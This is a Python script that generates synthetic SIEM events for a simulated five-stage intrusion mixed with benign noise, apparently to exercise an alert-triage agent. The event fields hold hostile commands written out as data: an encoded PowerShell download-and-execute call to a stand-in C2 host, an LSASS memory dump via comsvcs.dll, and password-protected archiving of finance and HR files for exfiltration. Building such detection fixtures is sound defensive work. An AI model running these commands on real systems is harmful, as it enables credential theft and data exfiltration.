"""
Load simulated attack chain + noise events into the security-alerts index.

Generates a realistic 5-stage attack chain across MITRE ATT&CK kill chain:
  Stage 1: T1566.001 — Phishing with macro-enabled attachment
  Stage 2: T1059.001 + T1071.001 — PowerShell execution + C2 beaconing
  Stage 3: T1003.001 — LSASS credential dumping
  Stage 4: T1021.002 — SMB lateral movement to 3+ hosts
  Stage 5: T1560.001 + T1041 — Data staging + exfiltration

Plus ~80 benign noise events the triage agent must filter through.

Network map:
  Attacker workstation: 10.10.15.42 (WS-PC0142)
  C2 server:            198.51.100.23 (external)
  Victim hosts:         10.10.10.101 (SRV-DC01), 10.10.10.102 (SRV-FILE01),
                        10.10.10.103 (SRV-DB01),  10.10.10.104 (SRV-WEB01)
  Mail server:          10.10.10.10  (SRV-MAIL01)
  DNS server:           10.10.10.2   (SRV-DNS01)

Timeline: 24-hour window, attack spans ~4 hours within.

Usage:
    python load_attack_data.py
"""

import sys
from datetime import datetime, timedelta, timezone

from elasticsearch.helpers import bulk
from rich.console import Console

from es_client import get_client

console = Console()

# ── Timeline Setup ────────────────────────────────────────────────────

# Anchor 12h ago so all events (spanning ~10h) are recent and in the past
BASE_TIME = datetime.now(timezone.utc) - timedelta(hours=12)


def ts(hours: float = 0, minutes: float = 0, seconds: float = 0) -> str:
    """Generate ISO timestamp offset from BASE_TIME."""
    dt = BASE_TIME + timedelta(hours=hours, minutes=minutes, seconds=seconds)
    return dt.isoformat()


# ── Stage 1: Phishing (T1566.001) ─────────────────────────────────────

STAGE_1_EVENTS = [
    {
        "@timestamp": ts(hours=2, minutes=14),
        "message": "Inbound email with macro-enabled attachment delivered to jsmith@acme.corp",
        "tags": ["attack", "stage-1", "phishing"],
        "event": {
            "kind": "alert",
            "category": "email",
            "type": "info",
            "action": "email-delivered",
            "severity": 65,
            "risk_score": 72.0,
        },
        "source": {"ip": "203.0.113.50", "domain": "mail-relay.suspiciousdomain.xyz"},
        "destination": {"ip": "10.10.10.10", "port": 25},
        "host": {"name": "SRV-MAIL01", "hostname": "srv-mail01.acme.corp", "ip": "10.10.10.10", "os": {"name": "Windows Server 2022", "platform": "windows"}},
        "user": {"name": "jsmith", "domain": "ACME"},
        "email": {
            "from": "hr-benefits@suspiciousdomain.xyz",
            "to": "jsmith@acme.corp",
            "subject": "Urgent: Updated Benefits Enrollment - Action Required",
            "attachments": {
                "file": {
                    "name": "Benefits_Enrollment_2026.xlsm",
                    "extension": "xlsm",
                    "hash": {"sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
                }
            },
        },
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0001", "name": "Initial Access"},
            "technique": {"id": "T1566", "name": "Phishing", "subtechnique": {"id": "T1566.001", "name": "Spearphishing Attachment"}},
        },
        "alert": {"severity": "high", "signature": "Macro-enabled attachment from external sender", "category": "phishing"},
        "rule": {"name": "Suspicious Email Attachment", "id": "rule-001", "description": "Detects macro-enabled Office documents from external senders"},
    },
    {
        "@timestamp": ts(hours=2, minutes=17),
        "message": "User jsmith opened macro-enabled Excel file Benefits_Enrollment_2026.xlsm",
        "tags": ["attack", "stage-1", "phishing"],
        "event": {
            "kind": "alert",
            "category": "process",
            "type": "start",
            "action": "process-created",
            "severity": 70,
            "risk_score": 75.0,
        },
        "source": {"ip": "10.10.15.42"},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42", "os": {"name": "Windows 11", "platform": "windows"}},
        "process": {
            "name": "EXCEL.EXE",
            "pid": 4820,
            "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\jsmith\\Downloads\\Benefits_Enrollment_2026.xlsm\"",
        },
        "user": {"name": "jsmith", "domain": "ACME"},
        "file": {
            "name": "Benefits_Enrollment_2026.xlsm",
            "path": "C:\\Users\\jsmith\\Downloads\\Benefits_Enrollment_2026.xlsm",
            "extension": "xlsm",
            "hash": {"sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
        },
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0001", "name": "Initial Access"},
            "technique": {"id": "T1566", "name": "Phishing", "subtechnique": {"id": "T1566.001", "name": "Spearphishing Attachment"}},
        },
        "alert": {"severity": "high", "signature": "Macro-enabled file opened by user", "category": "execution"},
        "rule": {"name": "Office Macro Execution", "id": "rule-002", "description": "Detects user opening macro-enabled Office documents"},
    },
    {
        "@timestamp": ts(hours=2, minutes=17, seconds=8),
        "message": "VBA macro executed dropper via EXCEL.EXE spawning cmd.exe",
        "tags": ["attack", "stage-1", "phishing", "execution"],
        "event": {
            "kind": "alert",
            "category": "process",
            "type": "start",
            "action": "process-created",
            "severity": 85,
            "risk_score": 88.0,
        },
        "source": {"ip": "10.10.15.42"},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42", "os": {"name": "Windows 11", "platform": "windows"}},
        "process": {
            "name": "cmd.exe",
            "pid": 5104,
            "executable": "C:\\Windows\\System32\\cmd.exe",
            "command_line": "cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAaABlAGwAbAAnACkA",
            "parent": {
                "name": "EXCEL.EXE",
                "pid": 4820,
                "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            },
        },
        "user": {"name": "jsmith", "domain": "ACME"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0002", "name": "Execution"},
            "technique": {"id": "T1059", "name": "Command and Scripting Interpreter", "subtechnique": {"id": "T1059.001", "name": "PowerShell"}},
        },
        "alert": {"severity": "critical", "signature": "Office application spawning command interpreter", "category": "execution"},
        "rule": {"name": "Suspicious Office Child Process", "id": "rule-003", "description": "Detects Office applications spawning cmd.exe or powershell.exe"},
    },
]

# ── Stage 2: C2 + PowerShell (T1059.001, T1071.001) ──────────────────

STAGE_2_EVENTS = [
    {
        "@timestamp": ts(hours=2, minutes=17, seconds=15),
        "message": "Encoded PowerShell downloading payload from C2 server 198.51.100.23",
        "tags": ["attack", "stage-2", "c2", "powershell"],
        "event": {
            "kind": "alert",
            "category": "process",
            "type": "start",
            "action": "process-created",
            "severity": 90,
            "risk_score": 92.0,
        },
        "source": {"ip": "10.10.15.42"},
        "destination": {"ip": "198.51.100.23", "port": 443, "domain": "cdn-update.malwaredomain.net"},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42", "os": {"name": "Windows 11", "platform": "windows"}},
        "process": {
            "name": "powershell.exe",
            "pid": 5200,
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAaABlAGwAbAAnACkA",
            "parent": {"name": "cmd.exe", "pid": 5104, "executable": "C:\\Windows\\System32\\cmd.exe"},
        },
        "user": {"name": "jsmith", "domain": "ACME"},
        "network": {"protocol": "https", "direction": "outbound", "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0002", "name": "Execution"},
            "technique": {"id": "T1059", "name": "Command and Scripting Interpreter", "subtechnique": {"id": "T1059.001", "name": "PowerShell"}},
        },
        "alert": {"severity": "critical", "signature": "Encoded PowerShell with network connection", "category": "execution"},
        "rule": {"name": "Encoded PowerShell Execution", "id": "rule-004", "description": "Detects Base64-encoded PowerShell commands"},
    },
    {
        "@timestamp": ts(hours=2, minutes=18),
        "message": "Outbound HTTPS connection to known-bad IP 198.51.100.23 (C2 beacon)",
        "tags": ["attack", "stage-2", "c2", "beaconing"],
        "event": {
            "kind": "alert",
            "category": "network",
            "type": "start",
            "action": "connection-attempted",
            "severity": 80,
            "risk_score": 85.0,
        },
        "source": {"ip": "10.10.15.42", "port": 49152, "bytes": 256},
        "destination": {"ip": "198.51.100.23", "port": 443, "domain": "cdn-update.malwaredomain.net", "bytes": 1024},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42"},
        "network": {"protocol": "https", "direction": "outbound", "bytes": 1280, "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0011", "name": "Command and Control"},
            "technique": {"id": "T1071", "name": "Application Layer Protocol", "subtechnique": {"id": "T1071.001", "name": "Web Protocols"}},
        },
        "alert": {"severity": "high", "signature": "C2 beacon to known-bad IP", "category": "c2"},
        "rule": {"name": "Known C2 IP Communication", "id": "rule-005"},
    },
]

# Add C2 beaconing events (every ~6 minutes over 2 hours)
for i in range(20):
    STAGE_2_EVENTS.append({
        "@timestamp": ts(hours=2, minutes=19 + i * 6, seconds=i % 5),
        "message": f"C2 beacon #{i+1} to 198.51.100.23:443 (interval ~60s)",
        "tags": ["attack", "stage-2", "c2", "beaconing"],
        "event": {
            "kind": "event",
            "category": "network",
            "type": "info",
            "action": "connection-attempted",
            "severity": 40,
            "risk_score": 65.0,
        },
        "source": {"ip": "10.10.15.42", "port": 49152 + i, "bytes": 200 + (i % 50)},
        "destination": {"ip": "198.51.100.23", "port": 443, "domain": "cdn-update.malwaredomain.net", "bytes": 512 + (i * 10)},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42"},
        "network": {"protocol": "https", "direction": "outbound", "bytes": 712 + (i * 10), "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0011", "name": "Command and Control"},
            "technique": {"id": "T1071", "name": "Application Layer Protocol", "subtechnique": {"id": "T1071.001", "name": "Web Protocols"}},
        },
    })

# ── Stage 3: Credential Dumping (T1003.001) ──────────────────────────

STAGE_3_EVENTS = [
    {
        "@timestamp": ts(hours=3, minutes=45),
        "message": "Suspicious process accessing LSASS memory — possible credential dumping",
        "tags": ["attack", "stage-3", "credential-access"],
        "event": {
            "kind": "alert",
            "category": "process",
            "type": "info",
            "action": "process-accessed",
            "severity": 95,
            "risk_score": 96.0,
        },
        "source": {"ip": "10.10.15.42"},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42", "os": {"name": "Windows 11", "platform": "windows"}},
        "process": {
            "name": "rundll32.exe",
            "pid": 6100,
            "executable": "C:\\Windows\\System32\\rundll32.exe",
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
            "parent": {"name": "powershell.exe", "pid": 5200, "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            "hash": {"sha256": "d4f5e6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5"},
        },
        "user": {"name": "jsmith", "domain": "ACME"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0006", "name": "Credential Access"},
            "technique": {"id": "T1003", "name": "OS Credential Dumping", "subtechnique": {"id": "T1003.001", "name": "LSASS Memory"}},
        },
        "alert": {"severity": "critical", "signature": "LSASS memory access via comsvcs.dll MiniDump", "category": "credential-access"},
        "rule": {"name": "LSASS Memory Dump Detected", "id": "rule-006", "description": "Detects LSASS credential dumping via comsvcs.dll"},
    },
    {
        "@timestamp": ts(hours=3, minutes=45, seconds=5),
        "message": "LSASS dump file created at C:\\Temp\\lsass.dmp (52MB)",
        "tags": ["attack", "stage-3", "credential-access"],
        "event": {
            "kind": "alert",
            "category": "file",
            "type": "creation",
            "action": "file-created",
            "severity": 90,
            "risk_score": 93.0,
        },
        "source": {"ip": "10.10.15.42"},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42"},
        "file": {
            "name": "lsass.dmp",
            "path": "C:\\Temp\\lsass.dmp",
            "extension": "dmp",
            "size": 54525952,
        },
        "process": {"name": "rundll32.exe", "pid": 6100},
        "user": {"name": "jsmith", "domain": "ACME"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0006", "name": "Credential Access"},
            "technique": {"id": "T1003", "name": "OS Credential Dumping", "subtechnique": {"id": "T1003.001", "name": "LSASS Memory"}},
        },
        "alert": {"severity": "critical", "signature": "LSASS dump file creation", "category": "credential-access"},
        "rule": {"name": "LSASS Dump File Created", "id": "rule-007"},
    },
]

# ── Stage 4: Lateral Movement (T1021.002) ─────────────────────────────

STAGE_4_EVENTS = [
    {
        "@timestamp": ts(hours=4, minutes=10),
        "message": "SMB authentication from WS-PC0142 to SRV-DC01 using admin_svc credentials",
        "tags": ["attack", "stage-4", "lateral-movement"],
        "event": {
            "kind": "alert",
            "category": "authentication",
            "type": "start",
            "action": "logged-in",
            "outcome": "success",
            "severity": 75,
            "risk_score": 80.0,
        },
        "source": {"ip": "10.10.15.42", "port": 49200},
        "destination": {"ip": "10.10.10.101", "port": 445},
        "host": {"name": "SRV-DC01", "hostname": "srv-dc01.acme.corp", "ip": "10.10.10.101", "os": {"name": "Windows Server 2022", "platform": "windows"}},
        "user": {"name": "admin_svc", "domain": "ACME", "id": "S-1-5-21-1234567890-1234567890-1234567890-1105"},
        "network": {"protocol": "smb", "direction": "inbound", "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0008", "name": "Lateral Movement"},
            "technique": {"id": "T1021", "name": "Remote Services", "subtechnique": {"id": "T1021.002", "name": "SMB/Windows Admin Shares"}},
        },
        "alert": {"severity": "high", "signature": "SMB lateral movement with service account", "category": "lateral-movement"},
        "rule": {"name": "Lateral Movement via SMB", "id": "rule-008"},
    },
    {
        "@timestamp": ts(hours=4, minutes=12),
        "message": "SMB authentication from WS-PC0142 to SRV-FILE01 using admin_svc credentials",
        "tags": ["attack", "stage-4", "lateral-movement"],
        "event": {
            "kind": "alert",
            "category": "authentication",
            "type": "start",
            "action": "logged-in",
            "outcome": "success",
            "severity": 75,
            "risk_score": 82.0,
        },
        "source": {"ip": "10.10.15.42", "port": 49210},
        "destination": {"ip": "10.10.10.102", "port": 445},
        "host": {"name": "SRV-FILE01", "hostname": "srv-file01.acme.corp", "ip": "10.10.10.102", "os": {"name": "Windows Server 2022", "platform": "windows"}},
        "user": {"name": "admin_svc", "domain": "ACME", "id": "S-1-5-21-1234567890-1234567890-1234567890-1105"},
        "network": {"protocol": "smb", "direction": "inbound", "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0008", "name": "Lateral Movement"},
            "technique": {"id": "T1021", "name": "Remote Services", "subtechnique": {"id": "T1021.002", "name": "SMB/Windows Admin Shares"}},
        },
        "alert": {"severity": "high", "signature": "SMB lateral movement with service account", "category": "lateral-movement"},
        "rule": {"name": "Lateral Movement via SMB", "id": "rule-008"},
    },
    {
        "@timestamp": ts(hours=4, minutes=15),
        "message": "SMB authentication from WS-PC0142 to SRV-DB01 using admin_svc credentials",
        "tags": ["attack", "stage-4", "lateral-movement"],
        "event": {
            "kind": "alert",
            "category": "authentication",
            "type": "start",
            "action": "logged-in",
            "outcome": "success",
            "severity": 80,
            "risk_score": 85.0,
        },
        "source": {"ip": "10.10.15.42", "port": 49220},
        "destination": {"ip": "10.10.10.103", "port": 445},
        "host": {"name": "SRV-DB01", "hostname": "srv-db01.acme.corp", "ip": "10.10.10.103", "os": {"name": "Windows Server 2022", "platform": "windows"}},
        "user": {"name": "admin_svc", "domain": "ACME", "id": "S-1-5-21-1234567890-1234567890-1234567890-1105"},
        "network": {"protocol": "smb", "direction": "inbound", "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0008", "name": "Lateral Movement"},
            "technique": {"id": "T1021", "name": "Remote Services", "subtechnique": {"id": "T1021.002", "name": "SMB/Windows Admin Shares"}},
        },
        "alert": {"severity": "high", "signature": "SMB lateral movement to database server", "category": "lateral-movement"},
        "rule": {"name": "Lateral Movement via SMB", "id": "rule-008"},
    },
    {
        "@timestamp": ts(hours=4, minutes=20),
        "message": "Remote service installation on SRV-FILE01 via admin_svc — possible persistence",
        "tags": ["attack", "stage-4", "lateral-movement", "persistence"],
        "event": {
            "kind": "alert",
            "category": "process",
            "type": "start",
            "action": "service-installed",
            "severity": 85,
            "risk_score": 87.0,
        },
        "source": {"ip": "10.10.15.42"},
        "destination": {"ip": "10.10.10.102"},
        "host": {"name": "SRV-FILE01", "hostname": "srv-file01.acme.corp", "ip": "10.10.10.102"},
        "process": {
            "name": "svchost.exe",
            "pid": 7200,
            "executable": "C:\\Windows\\System32\\svchost.exe",
            "command_line": "svchost.exe -k netsvcs -s RemoteAccess",
            "parent": {"name": "services.exe", "pid": 672},
        },
        "user": {"name": "admin_svc", "domain": "ACME"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0008", "name": "Lateral Movement"},
            "technique": {"id": "T1021", "name": "Remote Services", "subtechnique": {"id": "T1021.002", "name": "SMB/Windows Admin Shares"}},
        },
        "alert": {"severity": "high", "signature": "Remote service installation", "category": "lateral-movement"},
        "rule": {"name": "Remote Service Installation", "id": "rule-009"},
    },
]

# ── Stage 5: Data Staging + Exfiltration (T1560.001, T1041) ──────────

STAGE_5_EVENTS = [
    {
        "@timestamp": ts(hours=5, minutes=30),
        "message": "7-Zip archiving sensitive files from SRV-FILE01 shared drive",
        "tags": ["attack", "stage-5", "collection", "exfiltration"],
        "event": {
            "kind": "alert",
            "category": "process",
            "type": "start",
            "action": "process-created",
            "severity": 70,
            "risk_score": 78.0,
        },
        "source": {"ip": "10.10.10.102"},
        "host": {"name": "SRV-FILE01", "hostname": "srv-file01.acme.corp", "ip": "10.10.10.102"},
        "process": {
            "name": "7z.exe",
            "pid": 8100,
            "executable": "C:\\Program Files\\7-Zip\\7z.exe",
            "command_line": "7z.exe a -p\"exfil2026\" C:\\Temp\\archive.7z \"D:\\Finance\\Q4-2025\\*\" \"D:\\HR\\Employee_Records\\*\"",
            "parent": {"name": "powershell.exe", "pid": 7800},
        },
        "user": {"name": "admin_svc", "domain": "ACME"},
        "file": {"name": "archive.7z", "path": "C:\\Temp\\archive.7z", "extension": "7z"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0009", "name": "Collection"},
            "technique": {"id": "T1560", "name": "Archive Collected Data", "subtechnique": {"id": "T1560.001", "name": "Archive via Utility"}},
        },
        "alert": {"severity": "high", "signature": "Sensitive data archiving with password", "category": "collection"},
        "rule": {"name": "Data Staging via Archive", "id": "rule-010"},
    },
    {
        "@timestamp": ts(hours=5, minutes=45),
        "message": "Large outbound HTTPS transfer (245MB) to external IP 198.51.100.23",
        "tags": ["attack", "stage-5", "exfiltration"],
        "event": {
            "kind": "alert",
            "category": "network",
            "type": "info",
            "action": "connection-attempted",
            "severity": 90,
            "risk_score": 94.0,
        },
        "source": {"ip": "10.10.15.42", "port": 49300, "bytes": 256901120},
        "destination": {"ip": "198.51.100.23", "port": 443, "domain": "cdn-update.malwaredomain.net", "bytes": 4096},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42"},
        "network": {"protocol": "https", "direction": "outbound", "bytes": 256905216, "transport": "tcp"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0010", "name": "Exfiltration"},
            "technique": {"id": "T1041", "name": "Exfiltration Over C2 Channel"},
        },
        "alert": {"severity": "critical", "signature": "Large outbound data transfer to C2 IP", "category": "exfiltration"},
        "rule": {"name": "Data Exfiltration Detected", "id": "rule-011", "description": "Detects large outbound transfers to known-bad IPs"},
    },
    {
        "@timestamp": ts(hours=5, minutes=50),
        "message": "Temporary archive file deleted after exfiltration",
        "tags": ["attack", "stage-5", "defense-evasion"],
        "event": {
            "kind": "event",
            "category": "file",
            "type": "deletion",
            "action": "file-deleted",
            "severity": 50,
            "risk_score": 60.0,
        },
        "source": {"ip": "10.10.15.42"},
        "host": {"name": "WS-PC0142", "hostname": "ws-pc0142.acme.corp", "ip": "10.10.15.42"},
        "file": {"name": "archive.7z", "path": "C:\\Temp\\archive.7z", "extension": "7z"},
        "process": {"name": "powershell.exe", "pid": 5200, "command_line": "Remove-Item C:\\Temp\\archive.7z -Force"},
        "user": {"name": "jsmith", "domain": "ACME"},
        "threat": {
            "framework": "MITRE ATT&CK",
            "tactic": {"id": "TA0005", "name": "Defense Evasion"},
            "technique": {"id": "T1070", "name": "Indicator Removal", "subtechnique": {"id": "T1070.004", "name": "File Deletion"}},
        },
    },
]

# ── Noise Events (~80 benign events) ─────────────────────────────────

NOISE_EVENTS = []

# --- Normal user logins (15 events) ---
_users = ["mjones", "agarcia", "bnguyen", "cwilson", "dlee", "echen", "fkhan", "gpark"]
for i, user in enumerate(_users):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=i * 2.5 + 0.5, minutes=i * 7),
        "message": f"User {user} logged in to workstation WS-PC{1001+i:04d}",
        "tags": ["benign", "authentication"],
        "event": {"kind": "event", "category": "authentication", "type": "start", "action": "logged-in", "outcome": "success", "severity": 5},
        "source": {"ip": f"10.10.15.{50+i}"},
        "host": {"name": f"WS-PC{1001+i:04d}", "hostname": f"ws-pc{1001+i:04d}.acme.corp", "ip": f"10.10.15.{50+i}"},
        "user": {"name": user, "domain": "ACME"},
    })
    # Also add a logout
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=i * 2.5 + 8, minutes=i * 3),
        "message": f"User {user} logged out from WS-PC{1001+i:04d}",
        "tags": ["benign", "authentication"],
        "event": {"kind": "event", "category": "authentication", "type": "end", "action": "logged-out", "outcome": "success", "severity": 0},
        "source": {"ip": f"10.10.15.{50+i}"},
        "host": {"name": f"WS-PC{1001+i:04d}", "ip": f"10.10.15.{50+i}"},
        "user": {"name": user, "domain": "ACME"},
    })

# --- Failed logins (5 events — normal fat-finger / lockouts) ---
for i in range(5):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=1 + i * 3, minutes=22 + i * 11),
        "message": f"Failed login attempt for user {_users[i]} (bad password)",
        "tags": ["benign", "authentication", "failed"],
        "event": {"kind": "event", "category": "authentication", "type": "start", "action": "logged-in", "outcome": "failure", "severity": 15},
        "source": {"ip": f"10.10.15.{50+i}"},
        "host": {"name": f"WS-PC{1001+i:04d}", "ip": f"10.10.15.{50+i}"},
        "user": {"name": _users[i], "domain": "ACME"},
    })

# --- Web browsing traffic (15 events) ---
_websites = [
    ("93.184.216.34", "www.example.com"), ("142.250.80.46", "www.google.com"),
    ("151.101.1.140", "www.reddit.com"), ("104.244.42.65", "www.twitter.com"),
    ("157.240.1.35", "www.facebook.com"), ("52.94.236.248", "aws.amazon.com"),
    ("13.107.42.14", "www.office.com"), ("204.79.197.200", "www.bing.com"),
]
for i in range(15):
    site = _websites[i % len(_websites)]
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=0.5 + i * 1.5, minutes=i * 4),
        "message": f"HTTP/S traffic to {site[1]}",
        "tags": ["benign", "web"],
        "event": {"kind": "event", "category": "network", "type": "info", "action": "connection-attempted", "severity": 0},
        "source": {"ip": f"10.10.15.{50 + (i % 8)}", "port": 50000 + i, "bytes": 1024 + i * 200},
        "destination": {"ip": site[0], "port": 443, "domain": site[1], "bytes": 8192 + i * 500},
        "host": {"name": f"WS-PC{1001 + (i % 8):04d}", "ip": f"10.10.15.{50 + (i % 8)}"},
        "network": {"protocol": "https", "direction": "outbound", "transport": "tcp"},
    })

# --- DNS queries (10 events) ---
_dns_queries = [
    "www.google.com", "mail.acme.corp", "teams.microsoft.com",
    "update.windows.com", "cdn.jsdelivr.net", "api.github.com",
    "slack-msgs.com", "zoom.us", "docs.google.com", "pypi.org",
]
for i, domain in enumerate(_dns_queries):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=0.3 + i * 2.2, minutes=i * 6),
        "message": f"DNS query for {domain}",
        "tags": ["benign", "dns"],
        "event": {"kind": "event", "category": "network", "type": "info", "action": "dns-query", "severity": 0},
        "source": {"ip": f"10.10.15.{50 + (i % 8)}"},
        "destination": {"ip": "10.10.10.2", "port": 53, "domain": domain},
        "host": {"name": f"WS-PC{1001 + (i % 8):04d}", "ip": f"10.10.15.{50 + (i % 8)}"},
        "network": {"protocol": "dns", "direction": "outbound", "transport": "udp"},
    })

# --- AV / EDR scan events (8 events) ---
for i in range(8):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=i * 3, minutes=0),
        "message": f"Scheduled antivirus scan completed on WS-PC{1001+i:04d} — 0 threats found",
        "tags": ["benign", "av-scan"],
        "event": {"kind": "event", "category": "process", "type": "info", "action": "scan-completed", "outcome": "success", "severity": 0},
        "host": {"name": f"WS-PC{1001+i:04d}", "ip": f"10.10.15.{50+i}"},
        "process": {"name": "MsMpEng.exe", "pid": 1200 + i, "executable": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe"},
    })

# --- Scheduled tasks / cron (5 events) ---
_tasks = [
    ("Windows Update Check", "wuauclt.exe"),
    ("Disk Cleanup", "cleanmgr.exe"),
    ("Certificate Sync", "certutil.exe"),
    ("Group Policy Update", "gpupdate.exe"),
    ("WSUS Report", "wuauclt.exe"),
]
for i, (name, exe) in enumerate(_tasks):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=i * 4 + 1, minutes=0),
        "message": f"Scheduled task '{name}' executed on SRV-DC01",
        "tags": ["benign", "scheduled-task"],
        "event": {"kind": "event", "category": "process", "type": "start", "action": "process-created", "severity": 0},
        "host": {"name": "SRV-DC01", "hostname": "srv-dc01.acme.corp", "ip": "10.10.10.101"},
        "process": {"name": exe, "pid": 2000 + i, "executable": f"C:\\Windows\\System32\\{exe}"},
    })

# --- File server access (5 events) ---
for i in range(5):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=2 + i * 2, minutes=30 + i * 5),
        "message": f"User {_users[i]} accessed shared folder on SRV-FILE01",
        "tags": ["benign", "file-access"],
        "event": {"kind": "event", "category": "file", "type": "access", "action": "file-accessed", "severity": 0},
        "source": {"ip": f"10.10.15.{50+i}"},
        "destination": {"ip": "10.10.10.102", "port": 445},
        "host": {"name": "SRV-FILE01", "ip": "10.10.10.102"},
        "user": {"name": _users[i], "domain": "ACME"},
        "network": {"protocol": "smb", "direction": "inbound", "transport": "tcp"},
    })

# --- Print jobs (3 events) ---
for i in range(3):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=3 + i * 3, minutes=15 + i * 10),
        "message": f"Print job submitted by {_users[i]} to PRINTER-FL2",
        "tags": ["benign", "print"],
        "event": {"kind": "event", "category": "process", "type": "info", "action": "print-job", "severity": 0},
        "source": {"ip": f"10.10.15.{50+i}"},
        "host": {"name": f"WS-PC{1001+i:04d}", "ip": f"10.10.15.{50+i}"},
        "user": {"name": _users[i], "domain": "ACME"},
    })

# --- VPN connections (4 events) ---
for i in range(4):
    NOISE_EVENTS.append({
        "@timestamp": ts(hours=0.5 + i * 5, minutes=5),
        "message": f"VPN connection established for {_users[4+i]} from 192.168.1.{100+i}",
        "tags": ["benign", "vpn"],
        "event": {"kind": "event", "category": "authentication", "type": "start", "action": "vpn-connected", "outcome": "success", "severity": 0},
        "source": {"ip": f"192.168.1.{100+i}"},
        "destination": {"ip": "10.10.10.1", "port": 443},
        "host": {"name": "VPN-GW01", "ip": "10.10.10.1"},
        "user": {"name": _users[4 + (i % 4)], "domain": "ACME"},
        "network": {"protocol": "ipsec", "direction": "inbound", "transport": "udp"},
    })


def load_attack_data() -> int:
    """
    Bulk-load all attack and noise events into the security-alerts index.

    Returns:
        Total number of events loaded.
    """
    es = get_client()

    all_events = (
        STAGE_1_EVENTS
        + STAGE_2_EVENTS
        + STAGE_3_EVENTS
        + STAGE_4_EVENTS
        + STAGE_5_EVENTS
        + NOISE_EVENTS
    )

    actions = [
        {"_index": "security-alerts", "_source": event}
        for event in all_events
    ]

    success, errors = bulk(es, actions, raise_on_error=False)

    attack_count = (
        len(STAGE_1_EVENTS)
        + len(STAGE_2_EVENTS)
        + len(STAGE_3_EVENTS)
        + len(STAGE_4_EVENTS)
        + len(STAGE_5_EVENTS)
    )
    noise_count = len(NOISE_EVENTS)

    console.print(f"  [cyan]Stage 1 (Phishing):[/]           {len(STAGE_1_EVENTS)} events")
    console.print(f"  [cyan]Stage 2 (C2 + PowerShell):[/]    {len(STAGE_2_EVENTS)} events")
    console.print(f"  [cyan]Stage 3 (Credential Access):[/]  {len(STAGE_3_EVENTS)} events")
    console.print(f"  [cyan]Stage 4 (Lateral Movement):[/]   {len(STAGE_4_EVENTS)} events")
    console.print(f"  [cyan]Stage 5 (Exfiltration):[/]       {len(STAGE_5_EVENTS)} events")
    console.print(f"  [dim]Noise events:[/]                  {noise_count} events")
    console.print(f"\n  [bold green]Total:[/] {success} events indexed successfully")

    if errors:
        console.print(f"  [bold red]Errors:[/] {len(errors)} events failed")
        for err in errors[:3]:
            console.print(f"    {err}")

